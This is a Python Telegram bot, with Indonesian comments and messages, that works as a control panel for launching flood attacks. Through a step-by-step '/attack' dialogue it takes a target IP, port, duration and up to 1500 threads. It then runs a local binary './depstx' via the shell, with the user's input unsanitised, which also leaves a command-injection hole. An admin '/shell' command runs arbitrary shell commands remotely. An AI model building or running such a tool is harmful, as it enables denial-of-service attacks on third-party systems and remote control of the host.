# AUTO INSTALL DEPENDENCIES
import sys
import subprocess

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

for dep in ['pyrogram', 'tgcrypto']:
    try:
        __import__(dep)
    except ImportError:
        install(dep)

import os
import json
import time
from pyrogram import Client, filters, enums
from pyrogram.types import ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton, Message, InputFile

# KONFIGURASI
ADMIN_IDS = [7316824198]  # Masukkan ID admin Anda di sini
ALLOWED_GROUPS = [-1002573717371]  # Jika ingin membatasi grup, isi di sini
USER_FILE = 'stxusers.json'
BOTS_FILE = 'bots.json'
LOG_FILE = 'log.txt'
SESSION_DIR = 'sessions'
MAX_DURATION = 360
MAX_THREAD = 1500

os.makedirs(SESSION_DIR, exist_ok=True)
if not os.path.exists(USER_FILE):
    with open(USER_FILE, 'w') as f:
        json.dump([], f)
if not os.path.exists(BOTS_FILE):
    with open(BOTS_FILE, 'w') as f:
        json.dump([], f)

def load_users():
    try:
        with open(USER_FILE) as f:
            return json.load(f)
    except:
        return []

def save_users(users):
    with open(USER_FILE, 'w') as f:
        json.dump(users, f)

def load_tokens():
    try:
        with open(BOTS_FILE) as f:
            return json.load(f)
    except:
        return []

def save_tokens(tokens):
    with open(BOTS_FILE, 'w') as f:
        json.dump(tokens, f)

def log_command(user_id, cmd, params):
    line = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] UserID: {user_id} CMD: {cmd} PARAMS: {json.dumps(params)}\n"
    with open(LOG_FILE, 'a') as f:
        f.write(line)

def is_admin(user_id):
    return user_id in ADMIN_IDS

def is_allowed_group(group_id):
    return group_id in ALLOWED_GROUPS or not ALLOWED_GROUPS

def is_allowed_user(user_id):
    users = load_users()
    return user_id in users or is_admin(user_id)

def send_admins(app, text):
    for admin in ADMIN_IDS:
        try:
            app.send_message(admin, text)
        except Exception:
            pass

# Fungsi utama untuk menjalankan bot instance dari token
def run_bot(token):
    session_name = os.path.join(SESSION_DIR, f'session_{token[:8]}')
    app = Client(session_name, bot_token=token, parse_mode=enums.ParseMode.HTML)

    attack_sessions = {}

    @app.on_message(filters.command("start") & filters.private)
    def start_handler(client, message: Message):
        full_name = message.from_user.first_name or ""
        user_id = message.from_user.id
        text = (f"👋 Halo, {full_name}!\n"
                "Selamat datang di Bot STX!\n"
                "Gunakan /bantuan untuk melihat menu.")
        message.reply(text)
        send_admins(client, f"Pengguna baru menekan /start:\n🆔 UserID: {user_id}\n👤 Nama: {full_name}")

    @app.on_message(filters.command("bantuan"))
    def bantuan_handler(client, message: Message):
        text = ("📖 Fitur Bot:\n"
                "- /adduser <id> : Tambah user baru (admin)\n"
                "- /deleteuser <id> : Hapus user (admin)\n"
                "- /attack : Mulai serangan\n"
                "- /myid : Lihat ID Anda\n"
                "- /shell <perintah> : Jalankan perintah shell (hanya admin)\n"
                "- /addbot <token> : Tambah bot baru (hanya admin)\n"
                "- /deletebot <token> : Hapus bot (hanya admin)\n"
                "- /logs : Lihat log perintah (admin)\n"
                "- /bantuan : Bantuan\n"
                "- /upload <chat_id> : Upload file ke chat id\n"
        )
        message.reply(text)

    @app.on_message(filters.command("myid"))
    def myid_handler(client, message: Message):
        message.reply(f"🆔 ID Anda: {message.from_user.id}")

    @app.on_message(filters.command("adduser") & filters.private)
    def adduser_handler(client, message: Message):
        if not is_admin(message.from_user.id):
            return message.reply("❌ Hanya admin!")
        args = message.text.split()
        if len(args) < 2 or not args[1].isdigit():
            return message.reply("Format: /adduser <id>")
        uid = int(args[1])
        users = load_users()
        if uid not in users:
            users.append(uid)
            save_users(users)
            message.reply("✅ User berhasil ditambah.")
        else:
            message.reply("User sudah ada.")

    @app.on_message(filters.command("deleteuser") & filters.private)
    def deleteuser_handler(client, message: Message):
        if not is_admin(message.from_user.id):
            return message.reply("❌ Hanya admin!")
        args = message.text.split()
        if len(args) < 2 or not args[1].isdigit():
            return message.reply("Format: /deleteuser <id>")
        uid = int(args[1])
        users = load_users()
        if uid in users:
            users.remove(uid)
            save_users(users)
            message.reply("✅ User berhasil dihapus.")
        else:
            message.reply("User tidak ditemukan.")

    @app.on_message(filters.command("addbot") & filters.private)
    def addbot_handler(client, message: Message):
        if not is_admin(message.from_user.id):
            return message.reply("❌ Hanya admin!")
        args = message.text.split()
        if len(args) < 2:
            return message.reply("Format: /addbot <token>")
        token = args[1]
        tokens = load_tokens()
        if token not in tokens:
            tokens.append(token)
            save_tokens(tokens)
            message.reply("✅ Bot baru ditambahkan! Restart script untuk menjalankan bot baru.")
        else:
            message.reply("Bot sudah ada.")

    @app.on_message(filters.command("deletebot") & filters.private)
    def deletebot_handler(client, message: Message):
        if not is_admin(message.from_user.id):
            return message.reply("❌ Hanya admin!")
        args = message.text.split()
        if len(args) < 2:
            return message.reply("Format: /deletebot <token>")
        token = args[1]
        tokens = load_tokens()
        if token in tokens:
            tokens.remove(token)
            save_tokens(tokens)
            message.reply("✅ Bot berhasil dihapus.")
        else:
            message.reply("Bot tidak ditemukan.")

    @app.on_message(filters.command("logs") & filters.private)
    def logs_handler(client, message: Message):
        if not is_admin(message.from_user.id):
            return message.reply("❌ Hanya admin!")
        if not os.path.exists(LOG_FILE):
            return message.reply("Log kosong.")
        with open(LOG_FILE, 'rb') as f:
            message.reply_document(f, caption="Log Perintah")

    @app.on_message(filters.command("shell") & filters.private)
    def shell_handler(client, message: Message):
        if not is_admin(message.from_user.id):
            return message.reply("Hanya admin!")
        cmd = message.text.replace('/shell', '').strip()
        if not cmd:
            return message.reply("Perintah kosong!")
        try:
            result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=20)
            output = result.stdout if result.returncode == 0 else result.stderr
            message.reply(f"<code>{output}</code>")
        except Exception as e:
            message.reply(f"Error: {str(e)}")

    # UPLOAD FILE KE CHAT_ID DENGAN DRAG AND DROP DARI TERMINAL
    @app.on_message(filters.command("upload") & filters.private)
    def upload_handler(client, message: Message):
        if not is_admin(message.from_user.id):
            return message.reply("❌ Hanya admin!")
        args = message.text.split()
        if len(args) < 2:
            return message.reply("Gunakan: /upload <chat_id>")
        chat_id = args[1]
        message.reply("Silakan drag & drop file ke terminal (input path file):")
        try:
            file_path = input("Masukkan path file yang akan diupload: ").strip()
            if not os.path.isfile(file_path):
                return message.reply("File tidak ditemukan.")
            client.send_document(int(chat_id), InputFile(file_path))
            message.reply("✅ File berhasil dikirim.")
        except Exception as e:
            message.reply(f"Error upload: {str(e)}")

    # MIDDLEWARE: CEK AKSES USER/ADMIN/GRUP
    @app.on_message(filters.group | filters.private)
    def access_control(client, message: Message):
        user_id = message.from_user.id
        chat = message.chat
        allowed = False
        if is_admin(user_id) or is_allowed_user(user_id):
            allowed = True
        elif chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP] and is_allowed_group(chat.id):
            allowed = True
        if not allowed:
            if chat.type == enums.ChatType.PRIVATE:
                message.reply("❌ Akses ditolak. Silakan hubungi admin untuk meminta akses.")
            return

    # ATTACK FUNGSI (PRIVATE & GRUP)
    @app.on_message(filters.command("attack"))
    def attack_entry(client, message: Message):
        user_id = message.from_user.id
        chat_id = message.chat.id
        # Simpan sesi per user
        attack_sessions[user_id] = {"step": 1, "data": {}, "chat_id": chat_id}
        message.reply("Masukkan IP target:")

    @app.on_message(filters.text & ~filters.command(["start", "bantuan", "myid", "adduser", "deleteuser", "addbot", "deletebot", "logs", "shell", "upload"]))
    def attack_steps(client, message: Message):
        user_id = message.from_user.id
        session = attack_sessions.get(user_id)
        if not session or session["chat_id"] != message.chat.id:
            return
        step = session["step"]
        data = session["data"]
        if step == 1:
            data["ip"] = message.text.strip()
            session["step"] = 2
            message.reply("Masukkan port:")
        elif step == 2:
            try:
                port = int(message.text.strip())
                data["port"] = port
                session["step"] = 3
                message.reply("Masukkan durasi (maks 360 detik):")
            except:
                message.reply("Port harus angka! Masukkan ulang port:")
        elif step == 3:
            try:
                durasi = int(message.text.strip())
                if durasi > MAX_DURATION or durasi < 1:
                    raise ValueError
                data["durasi"] = durasi
                session["step"] = 4
                message.reply("Masukkan jumlah thread (maks 1500):")
            except:
                message.reply(f"Durasi harus angka dan maksimal {MAX_DURATION} detik! Masukkan ulang durasi:")
        elif step == 4:
            try:
                thread = int(message.text.strip())
                if thread > MAX_THREAD or thread < 1:
                    raise ValueError
                data["thread"] = thread
                session["step"] = 5
                # Konfirmasi
                markup = InlineKeyboardMarkup([
                    [
                        InlineKeyboardButton("✅ YA", callback_data="attack_yes"),
                        InlineKeyboardButton("❌ TIDAK", callback_data="attack_no")
                    ],
                    [
                        InlineKeyboardButton("🛑 STOP", callback_data="attack_stop")
                    ]
                ])
                confirm_msg = (f"Konfirmasi serangan:\n"
                               f"IP: {data['ip']}\n"
                               f"Port: {data['port']}\n"
                               f"Durasi: {data['durasi']}\n"
                               f"Thread: {data['thread']}")
                msg = message.reply(confirm_msg, reply_markup=markup)
                session["confirm_msg_id"] = msg.id
            except:
                message.reply(f"Thread harus angka dan maksimal {MAX_THREAD}! Masukkan ulang thread:")

    @app.on_callback_query()
    def handle_attack_confirm(client, callback_query):
        user_id = callback_query.from_user.id
        session = attack_sessions.get(user_id)
        if not session:
            callback_query.answer("Session tidak ditemukan.")
            return
        data = session["data"]
        chat_id = session["chat_id"]
        # Hapus pesan konfirmasi setelah ditekan
        try:
            client.delete_messages(chat_id, [session.get("confirm_msg_id", callback_query.message.id)])
        except:
            pass
        if callback_query.data == "attack_yes":
            cmd = f"./depstx {data['ip']} {data['port']} {data['durasi']} {data['thread']}"
            log_command(user_id, "attack", data)
            client.send_message(chat_id, "⏳ Menjalankan serangan...")
            time.sleep(4)
            try:
                result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=(data['durasi']+5))
                if result.returncode != 0:
                    client.send_message(chat_id, f"❌ Gagal mengeksekusi serangan.\n{result.stderr}")
                else:
                    client.send_message(chat_id, "🔥 Serangan selesai!")
            except Exception as e:
                client.send_message(chat_id, f"❌ Gagal mengeksekusi serangan.\n{str(e)}")
        elif callback_query.data == "attack_no":
            client.send_message(chat_id, "❎ Serangan dibatalkan.")
        elif callback_query.data == "attack_stop":
            client.send_message(chat_id, "🛑 Permintaan stop serangan.")
        attack_sessions.pop(user_id, None)
        callback_query.answer()

    print(f"Bot berjalan dengan token: {token}")
    app.run()

if __name__ == "__main__":
    tokens = load_tokens()
    if not tokens:
        print("Belum ada token bot! Tambahkan token dengan perintah /addbot <token> melalui chat admin.")
    else:
        from multiprocessing import Process
        procs = []
        for token in tokens:
            p = Process(target=run_bot, args=(token,))
            p.start()
            procs.append(p)
        for p in procs:
            p.join()